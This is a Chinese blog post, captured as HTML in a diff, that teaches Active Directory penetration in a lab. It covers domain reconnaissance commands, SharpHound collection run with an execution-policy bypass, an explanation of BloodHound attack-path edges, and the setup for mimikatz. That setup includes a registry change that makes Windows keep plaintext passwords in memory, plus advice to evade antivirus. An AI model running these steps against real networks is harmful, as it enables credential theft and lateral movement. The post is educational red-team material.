@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="zn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="IcMl0x824">
+    <meta name="author" content="IcMl0x24">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/03/14/hongri1/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="域渗透攻防之域内信息搜集&amp;寻血猎犬BloodHound&amp;猕猴桃mimikatz&amp;转储密码和散列">
+    <meta property="og:description" content="IcMl0x824">
+    <meta property="og:url" content="http://example.com2023/03/14/hongri1/">
+    
+    <meta property="og:site_name" content="IcMl0x24 &#39;s Blog">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="域渗透攻防之域内信息搜集&amp;寻血猎犬BloodHound&amp;猕猴桃mimikatz&amp;转储密码和散列">
+    <meta name="twitter:description" content="IcMl0x824">
+    <meta name="twitter:image" content="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    <meta name="theme-color" content="#0066cc">
+    <link rel="shortcut icon" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    
+    <title>
+        
+            域渗透攻防之域内信息搜集&amp;寻血猎犬BloodHound&amp;猕猴桃mimikatz&amp;转储密码和散列 -
+        
+        IcMl0x24 &#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    
+    
+    
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"example.com","root":"/","language":"zn"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","avatar":"https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png","favicon":"https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":55},"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_image":{"light":"https://img-s-msn-com.akamaized.net/tenant/amp/entityid/AA12sapl.img","dark":"https://img-s-msn-com.akamaized.net/tenant/amp/entityid/AA12rZ8k.img"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"font_sizes":{"title":"2.8rem","subtitle":"1.5rem"},"line_height":1.2,"title":"春江潮水连海平 海上明月共潮生","subtitle":{"enable":true,"list":["滟滟随波千万里","何处春江无月明"]},"custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.1","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":false,"audio":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}}};
+    REDEFINE.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="menu-wrapper">
+    
+    <div class="menu-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                IcMl0x24 &#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="menu-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+            
+                <div class="article-title">
+                    <h1 class="article-title-regular">域渗透攻防之域内信息搜集&amp;寻血猎犬BloodHound&amp;猕猴桃mimikatz&amp;转储密码和散列</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">IcMl0x24</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-03-14 20:32:19</span>
+        <span class="mobile">2023-03-14 20:32</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="pc">2023-03-14 20:33:27</span>
+            <span class="mobile">2023-03-14 20:33</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2-BloodHound-mimikatz/">域渗透攻防 BloodHound mimikatz</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h3 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h3><p>请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，猫哥的秋刀鱼回忆录及文章作者不为此承担任何责任。猫哥的秋刀鱼回忆录公众号均不发表带原创标志的文章，转载请附带公众号出处！</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在阅读本文前，我默认你已然了解域的基本概念，域环境与工作组环境的区别。本文主要叙述几点命题：</p>
+<ol>
+<li>判断域环境，并且定位域控制器的IP地址，获取域内其他成员机器的信息，是域内信息搜集的主要工作</li>
+<li>通过 猎犬BloodHound 使用可视化图形显示域环境中的关系，识别高度复杂的攻击路径，深入域环境中的权限关系</li>
+<li>利用 猕猴桃mimikatz 获取windows用户密码或者Hash，用于远程登录域内其他机器，为进行后续的哈希传递和票据传递攻击提供基础</li>
+<li>了解基于IPC的横向移动远程控制技术</li>
+</ol>
+<p>鲁迅《伤逝》中写道：</p>
+<blockquote>
+<p>想给她一点慰藉。然而我的笑貌一上脸，我的话一出口，却即刻变为空虚,这空虚又即刻发生反响，回向我的耳目里，给我一个难堪的恶毒的冷嘲。</p>
+</blockquote>
+<h3 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h3><p>在实际的域内信息搜集过程中，我们通过使用DOS命令，实际上是对自己基础知识掌握程度的一个检验和了解。但更多生产环境中我们比较喜欢用现成的脚本插件来达到一键收集信息搜集的目的。这样的作用是能够加快我们的工作效率，减少不必要的时间浪费在这里面。当然命令行对于我们自身的素养也是有一个很大的帮助的，万变不离其宗，所有工具总归是要基于这些基石。</p>
+<h5 id="是否存在域环境"><a href="#是否存在域环境" class="headerlink" title="是否存在域环境"></a>是否存在域环境</h5><p>我们一般通过查询时间服务器来判断是否存在域，因为一般时间服务器就是域控机器，我们可以通过ping来获取DC域控的IP。当然也可以通过DNS后缀判断是否存在域</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041154091.png"
+                      alt="image-20230204115455058"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041155595.png"
+                      alt="image-20230204115555550"
+                ></p>
+<h5 id="信任域有哪些？"><a href="#信任域有哪些？" class="headerlink" title="信任域有哪些？"></a>信任域有哪些？</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v /server:DC域控IP </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041157822.png"
+                      alt="image-20230204115748792"
+                ></p>
+<h5 id="域的详细情况"><a href="#域的详细情况" class="headerlink" title="域的详细情况"></a>域的详细情况</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /dsgetdc:域名 /server:DC域控IP </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041159229.png"
+                      alt="image-20230204115945195"
+                ></p>
+<h5 id="域控的主机名"><a href="#域控的主机名" class="headerlink" title="域控的主机名"></a>域控的主机名</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041200389.png"
+                      alt="image-20230204120046339"
+                ></p>
+<h5 id="域管理用户"><a href="#域管理用户" class="headerlink" title="域管理用户"></a>域管理用户</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041201743.png"
+                      alt="image-20230204120122712"
+                ></p>
+<h5 id="查询域控制器"><a href="#查询域控制器" class="headerlink" title="查询域控制器"></a>查询域控制器</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041216900.png"
+                      alt="image-20230204121600868"
+                ></p>
+<h5 id="查询域机器"><a href="#查询域机器" class="headerlink" title="查询域机器"></a>查询域机器</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041215921.png"
+                      alt="image-20230204121550883"
+                ></p>
+<h5 id="查询域里面的组"><a href="#查询域里面的组" class="headerlink" title="查询域里面的组"></a>查询域里面的组</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041215152.png"
+                      alt="image-20230204121526116"
+                ></p>
+<h5 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041214446.png"
+                      alt="image-20230204121452409"
+                ></p>
+<h5 id="查看共享"><a href="#查看共享" class="headerlink" title="查看共享"></a>查看共享</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view \\IP</span><br><span class="line">net view \\主机名 </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041212054.png"
+                      alt="image-20230204121231022"
+                ></p>
+<h5 id="域内所有用户SID"><a href="#域内所有用户SID" class="headerlink" title="域内所有用户SID"></a>域内所有用户SID</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get Caption,sid </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041212838.png"
+                      alt="image-20230204121205804"
+                ></p>
+<h3 id="寻血猎犬BloodHound"><a href="#寻血猎犬BloodHound" class="headerlink" title="寻血猎犬BloodHound"></a>寻血猎犬BloodHound</h3><p>BloodHound是一个单页Javascript Web应用程序，建立在<a class="link"   target="_blank" rel="noopener" href="http://linkurio.us/" >Linkurious <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>之上，用<a class="link"   target="_blank" rel="noopener" href="http://electron.atom.io/" >Electron <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>编译，<a class="link"   target="_blank" rel="noopener" href="https://neo4j.com/" >Neo4j <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>数据库由C#数据收集器提供BloodHound使用图论来揭示Active Directory或Azure环境中隐藏的和通常是意想不到的关系。攻击者可以使用BloodHound轻松识别高度复杂的攻击路径，否则无法快速识别。防御者可以使用寻血猎犬来识别和消除这些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松更深入地了解ActiveDirectory 或Azure环境中的权限关系。</p>
+<p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此需要安装 Neo4j 数据库。</p>
+<h5 id="安装与采集"><a href="#安装与采集" class="headerlink" title="安装与采集"></a>安装与采集</h5><p>使用SharpHound.exe进行数据的采集，将SharpHound.exe拷贝到目标上，它会自动采集域内的用户&#x2F;用户组&#x2F;计算机&#x2F;组策略&#x2F;域信任关系等信息，将采集到的所有信息在当前目录下打包成一个以时间戳标识的压缩文件，执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041221637.png"
+                      alt="image-20230204122148571"
+                ></p>
+<p>如果使用powershell脚本收集，注意使用方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -command &quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>采集到的数据会以压缩包的格式保存，拷贝到BloodHound所在主机上，Upload Data上传刚才生成的压缩包就可以导入数据了，或者直接拖动到里面也可以。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041223377.png"
+                      alt="image-20230204122325276"
+                ></p>
+<p>进入Analysis模块，点击不同的查询条件，就可以进行不同的分析查询。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041227937.png"
+                      alt="image-20230204122704846"
+                ></p>
+<p>汉化后的目录一览：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041227713.png"
+                      alt="image-20230204122751671"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041228114.png"
+                      alt="image-20230204122820073"
+                ></p>
+<p>以及在最下面，我们可以自定义进行查询。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041228929.png"
+                      alt="image-20230204122851899"
+                ></p>
+<h5 id="节点与信息"><a href="#节点与信息" class="headerlink" title="节点与信息"></a>节点与信息</h5><p>它主要通过图形与连线的方式来呈现数据，每一个图形都被称作为一个节点(Node)。通过图形的不同来表示域内的不同对象。域内不同的对象比如用户，用户组,计算机,域,组策略，组织单位等，它都有自己专属的图形来进行表示。</p>
+<p>我们只要随便点击一个节点，左侧就会出现节点信息，包括节点的一些概述,节点属性，所属组()，以及所拥有的权限等等。不同的对象包含着不同类型的节点信息。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041231257.png"
+                      alt="image-20230204123117145"
+                ></p>
+<h5 id="边缘与传递"><a href="#边缘与传递" class="headerlink" title="边缘与传递"></a>边缘与传递</h5><p>边缘是连接2个相互作用的节点之间的连线，它可以用来反映2个相互作用的节点之间的关系。如图所示，边缘MemberOF就代表着用户ADMINISTRATOR是用户组DOMAIN ADMINS的成员</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041234052.png"
+                      alt="image-20230204123440955"
+                ></p>
+<h5 id="整体页面功能"><a href="#整体页面功能" class="headerlink" title="整体页面功能"></a>整体页面功能</h5><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041243963.png"
+                      alt="img"
+                ></p>
+<h5 id="菜单与搜索栏"><a href="#菜单与搜索栏" class="headerlink" title="菜单与搜索栏"></a>菜单与搜索栏</h5><p>Database Info（数据库信息），可以查看当前数据库的基本信息，包括用户、计算机、组和关系（或边）的数量。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041244473.png"
+                      alt="img"
+                ></p>
+<p>Node Indo（节点信息），当单击某个节点时，可以显示对应节点的相关信息。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041244237.png"
+                      alt="img"
+                ></p>
+<p>Analysis（分析查询），在BloodHound中预置了一些查询条件，具体如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041245947.png"
+                      alt="img"
+                ></p>
+<p>右键查看功能菜单</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041245736.png"
+                      alt="img"
+                ></p>
+<h5 id="图标样式说明"><a href="#图标样式说明" class="headerlink" title="图标样式说明"></a>图标样式说明</h5><p>节点可以分为6种类型，分别是 Users 用户、Groups 组、Computers 计算机、Domain 域、GPOs 组策略对象、OUs 组织单位</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041246623.png"
+                      alt="img"
+                ></p>
+<p>每个节点中可以有不同的标记图标：</p>
+<ul>
+<li>蓝色位置图标表示开始节点</li>
+<li>白色骷髅头说明是已拥有节点</li>
+<li>红色靶子图标是目标节点</li>
+<li>钻石图标则是高价值目标</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041246720.png"
+                      alt="img"
+                ></p>
+<h5 id="节点关系说明"><a href="#节点关系说明" class="headerlink" title="节点关系说明"></a>节点关系说明</h5><p>在每个节点与节点之间都有对应的关系，分别代表着不同的意思。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041246500.png"
+                      alt="img"
+                ></p>
+<ul>
+<li><p>HasSession 当用户与计算机时进行会话时，凭据会保留在内存中，可用 LSASS 注入或者凭据转储来获取用户凭据。</p>
+</li>
+<li><p>MemberOf 表示组的成员，此节点是上一节点的成员，由末端指向上的尖端。</p>
+</li>
+<li><p>AdminTo 末端是尖端的本地管理员，本地管理员对这台计算机的管理权限比较大，下面的这个用户组是前一台计算机的本地管理员。</p>
+</li>
+<li><p>ACL Edges</p>
+<ul>
+<li>AllExtendedRights 扩展权限是授予对象的特殊权限，这些对象允许读取特权属性以及执行特殊操作；如果对象是用户，则可以重置用户密码；如果是组，则可以修改组成员；如果是计算机，则可以对该计算机执行基于资源的约束委派。</li>
+<li>AddMember 可以向目标安全组添加任意成员。</li>
+<li>ForceChangePassword 可以任意重置目标用户密码。</li>
+<li>GenericAll 可以完全控制目标对象。</li>
+<li>GenericWrite 写入权限，修改目标的属性或者将主体添加入组等。</li>
+<li>Owns 保留修改 security descriptors 的能力，会忽略DACL权限的限制。</li>
+<li>WriteDacl 可写入目标DACL，修改DACL访问权。</li>
+<li>WriteOwner 保留修改 security descriptors的能力，会忽略DACL权限的限制。</li>
+<li>ReadLAPSPassword 读取LAPS上的本地管理员凭证。</li>
+<li>ReadGMSAPassword 读取GMSA上的本地管理员凭证。</li>
+</ul>
+</li>
+<li><p>Containers</p>
+<ul>
+<li>Contains 可以在OU上添加一个新的ACE，它将继承到该OU下的所有子对象上，比如说在OU上应用GenericAll ACE ，那么所有子对象都将继承GenericAll属性。</li>
+<li>GpLink 将其设置为链接容器中的对象。</li>
+</ul>
+</li>
+<li><p>特殊 Edges</p>
+<ul>
+<li>CanRDP 用远程桌面进行会话。</li>
+<li>CanPSRemote 用PowerShell进行会话。</li>
+<li>ExecuteDCOM 实例化目标的COM对象并调用其方法，可以在特定条件下执行代码。</li>
+<li>AllowedToDelegate 有这个特权的节点可以将任何域主体(包括Domain Admins)模拟到目标主机上的特定服务。</li>
+<li>AddAllowedToAct 可以控制任意的安全主体伪装为特定计算机的任何域用户。</li>
+<li>AllowedToAct 可以使用此用户滥用S4U2self &#x2F; S4U2proxy进程，将任何域用户模拟到目标计算机系统，并以“该用户”身份接收有效的服务票证。</li>
+<li>SQLAdmin 该用户是目标计算机的MSSQL管理员。</li>
+<li>HasSIDHistory 用户的SID历史记录，用户在域迁移后，票据还包含着前域所在组的SID，虽然用户不属于前域，但仍拥有前域的权限。</li>
+</ul>
+</li>
+</ul>
+<h3 id="猕猴桃mimikatz"><a href="#猕猴桃mimikatz" class="headerlink" title="猕猴桃mimikatz"></a>猕猴桃mimikatz</h3><p>mimikatz是法国安全研究员Benjamin Delpy在GitHub开源的内网工具，可用来做一些关于Win内网安全的渗透实验；它在内网渗透中它可以从lsass.exe进程中提取明文密码、哈希值、PIN码和Kerberos票据，因此很多人称之为密码抓取神器；与此同时它还可以执行传递哈希值、传递票据、建立票据、伪造域管理凭证令牌等诸多功能等，我们在使用前尽量对mimikatz要进行免杀处理，因为该工具危害过大，大多数反病毒公司会对该工具进行拦截。</p>
+<ol>
+<li>靶场环境：域</li>
+<li>靶场资源：通过打点获得的一台域内主机权限 （普通用户）</li>
+<li>靶场系统：Win10 x64（虚拟机）+ Win sever 19域控（虚拟机）</li>
+</ol>
+<h5 id="使用前注意的问题"><a href="#使用前注意的问题" class="headerlink" title="使用前注意的问题"></a>使用前注意的问题</h5><p>在 Windows 中，SAM 文件是 Windows 用户的账户数据库，位于系统的%SystemRoot%\System32\Config 目录中，所有本地用户的用户名、密码哈希值等信息都存储在这个文件中。用户输入密码登录时，用户输入的明文密码被转换为哈希值，然后与 SAM 文件中的哈希值对比，若相同，则认证成功。Isass.exe 是Windows 的一个系统进程，用于实现系统的安全机制，主要用于本地安全和登录策略。在通常情况下，用户输入密码登录后，登录的域名、用户名和登录凭据等信息会存储在 Isass.exe 的进程空间中，用户的明文密码经过 WDigest 和 Tspkg模块调用后，会对其使用可逆的算法进行加密并存储在内存中。</p>
+<p>我们在获取域内单机密码和哈希之时，基本说是用工具来读取SAM文件或者访问lsass.exe进程的内存数据等操作实现的.这些操作大多需要管理员权限，这就意味着必须配合一些提权操作，才会对我们的密码抓取有一个帮助。</p>
+<p>windows-2012以上的系统不能直接获取明文密码了，需要配置相关注册表等操作。虽然微软很早就更新了补丁来防止获取windows的明文密码，但是可以修改注册表，使代表WDigest的密码支持明文形式保存在LSA内存中。具体补丁是KB2871997，关闭了Wdigest功能，禁止从内存中获取明文密码。修改注册表来让Wdigest Auth保存明文口令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 开启Wdigest</span><br><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"># 关闭Wdigest</span><br><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
+
+<p>获取权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br></pre></td></tr></table></figure></div>
+
+<p>抓取密码 </p>
